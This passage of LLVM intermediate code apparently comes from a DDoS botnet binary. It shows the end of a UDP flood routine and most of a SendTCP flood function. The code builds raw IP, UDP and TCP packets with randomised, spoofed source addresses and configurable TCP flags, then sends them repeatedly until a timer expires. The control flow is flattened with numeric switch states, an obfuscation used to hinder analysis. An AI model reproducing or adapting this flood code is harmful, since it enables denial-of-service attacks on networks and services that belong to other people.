  %.reload11 = load i32, i32* %.reg2mem10
  %126 = trunc i32 %.reload11 to i16
  %127 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.1* %128 to %struct.anon.2*
  %130 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %132 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.1* %132 to %struct.anon.2*
  %134 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %133, i32 0, i32 3
  store i16 0, i16* %134, align 2
  %135 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %136 = bitcast %struct.udphdr* %135 to i8*
  %137 = getelementptr inbounds i8, i8* %136, i64 8
  %138 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %137, i32 %138)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %139 = bitcast i8* %.reload8 to i16*
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  %142 = load i16, i16* %141, align 2
  %143 = zext i16 %142 to i32
  %144 = call zeroext i16 @csum(i16* %139, i32 %143)
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 7
  store i16 %144, i16* %146, align 2
  %147 = call i64 @time(i64* null) #5
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = add nsw i64 %147, %149
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 325690342, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1630552519, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %15, align 4
  %155 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %156 = call i64 @sendto(i32 %154, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %155, i32 16)
  %157 = call i32 @rand_cmwc()
  %158 = trunc i32 %157 to i16
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon.1* %160 to %struct.anon.2*
  %162 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %161, i32 0, i32 0
  store i16 %158, i16* %162, align 2
  %163 = load i32, i32* %8, align 4
  %164 = icmp eq i32 %163, 0
  %165 = select i1 %164, i32 1754212055, i32 -1851134834
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call i32 @rand_cmwc()
  store i32 1217435941, i32* %switchVar
  store i32 %167, i32* %.reg2mem12
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %8, align 4
  %170 = trunc i32 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #10
  %172 = zext i16 %171 to i32
  store i32 1217435941, i32* %switchVar
  store i32 %172, i32* %.reg2mem12
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %174 = trunc i32 %.reload13 to i16
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.1* %176 to %struct.anon.2*
  %178 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %177, i32 0, i32 1
  store i16 %174, i16* %178, align 2
  %179 = call i32 @rand_cmwc()
  %180 = trunc i32 %179 to i16
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i32, i32* %18, align 4
  %184 = call i32 @getRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #10
  %186 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %188 = bitcast i8* %.reload6 to i16*
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 2
  %191 = load i16, i16* %190, align 2
  %192 = zext i16 %191 to i32
  %193 = call zeroext i16 @csum(i16* %188, i32 %192)
  %194 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 7
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %23, align 4
  %197 = load i32, i32* %14, align 4
  %198 = icmp eq i32 %196, %197
  %199 = select i1 %198, i32 1180406060, i32 -78824597
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = call i64 @time(i64* null) #5
  %202 = load i32, i32* %22, align 4
  %203 = sext i32 %202 to i64
  %204 = icmp sgt i64 %201, %203
  %205 = select i1 %204, i32 525827683, i32 -657690246
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 -2055213205, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 325690342, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32, i32* %23, align 4
  %210 = add i32 %209, 1
  store i32 %210, i32* %23, align 4
  store i32 325690342, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %212)
  store i32 169162808, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %211, %208, %207, %206, %200, %173, %168, %166, %153, %152, %125, %120, %118, %73, %66, %61, %60, %59, %53, %52, %44, %43, %37, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1287210111, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1287210111, label %first
    i32 -1453945943, label %31
    i32 689128489, label %35
    i32 2008765008, label %40
    i32 1837487624, label %46
    i32 -2077216025, label %47
    i32 1855962993, label %54
    i32 1112618381, label %55
    i32 -1260073833, label %61
    i32 -1843405404, label %62
    i32 79566905, label %66
    i32 -337682405, label %67
    i32 504333406, label %73
    i32 -736917284, label %121
    i32 1195658758, label %157
    i32 -633448645, label %160
    i32 89195025, label %164
    i32 -2130228351, label %169
    i32 146291147, label %177
    i32 -1443806173, label %182
    i32 -201558440, label %190
    i32 -319023771, label %195
    i32 2052033531, label %203
    i32 -1976563628, label %208
    i32 -1372915164, label %216
    i32 1517134458, label %221
    i32 -1042365204, label %229
    i32 -1127081677, label %230
    i32 -1032676756, label %231
    i32 519135194, label %232
    i32 137620368, label %233
    i32 1280742852, label %234
    i32 857434678, label %236
    i32 1719009309, label %237
    i32 624331361, label %255
    i32 196776881, label %257
    i32 1991035281, label %262
    i32 775453708, label %288
    i32 158673023, label %289
    i32 -1716821187, label %336
    i32 -2097019986, label %342
    i32 86493832, label %343
    i32 1956584359, label %344
    i32 -1178723038, label %347
    i32 -1100023415, label %349
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 -1453945943, i32 689128489
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 2008765008, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 2008765008, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 1837487624, i32 -2077216025
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1100023415, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1112618381, i32 1855962993
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1100023415, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #5
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 -1260073833, i32 -1843405404
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1100023415, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %14, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 79566905, i32 -337682405
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 504333406, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %14, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 504333406, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %11, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #9
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 1195658758, i32 -736917284
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon* %137 to %struct.anon.0*
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon* %144 to %struct.anon.0*
  %146 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon* %151 to %struct.anon.0*
  %153 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  store i32 1719009309, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %11, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0)) #5
  store i8* %159, i8** %23, align 8
  store i32 -633448645, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8*, i8** %23, align 8
  %162 = icmp ne i8* %161, null
  %163 = select i1 %162, i32 89195025, i32 857434678
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.104, i32 0, i32 0)) #9
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 146291147, i32 -2130228351
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon* %171 to %struct.anon.0*
  %173 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  store i32 1280742852, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #9
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 -201558440, i32 -1443806173
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon* %184 to %struct.anon.0*
  %186 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  store i32 137620368, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %23, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #9
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 2052033531, i32 -319023771
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon* %197 to %struct.anon.0*
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -257
  %202 = or i16 %201, 256
  store i16 %202, i16* %199, align 4
  store i32 519135194, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %23, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #9
  %206 = icmp ne i32 %205, 0
  %207 = select i1 %206, i32 -1372915164, i32 -1976563628
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon* %210 to %struct.anon.0*
  %212 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -4097
  %215 = or i16 %214, 4096
  store i16 %215, i16* %212, align 4
  store i32 -1032676756, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %23, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 -1042365204, i32 1517134458
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon* %223 to %struct.anon.0*
  %225 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -2049
  %228 = or i16 %227, 2048
  store i16 %228, i16* %225, align 4
  store i32 -1127081677, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 -1127081677, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 -1032676756, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 519135194, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 137620368, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 1280742852, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %235, i8** %23, align 8
  store i32 -633448645, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 1719009309, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %9, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 624331361, i32 196776881
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 1991035281, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %9, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #10
  %261 = zext i16 %260 to i32
  store i32 1991035281, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon* %265 to %struct.anon.0*
  %267 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i64 @time(i64* null) #5
  %284 = load i32, i32* %10, align 4
  %285 = sext i32 %284 to i64
  %286 = add nsw i64 %283, %285
  %287 = trunc i64 %286 to i32
  store i32 %287, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 775453708, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  store i32 158673023, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %17, align 4
  %291 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %292 = call i64 @sendto(i32 %290, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %291, i32 16)
  %293 = load i32, i32* %19, align 4
  %294 = call i32 @getRandomIP(i32 %293)
  %295 = call i32 @htonl(i32 %294) #10
  %296 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 8
  store i32 %295, i32* %297, align 4
  %298 = call i32 @rand_cmwc()
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  %302 = call i32 @rand_cmwc()
  %303 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
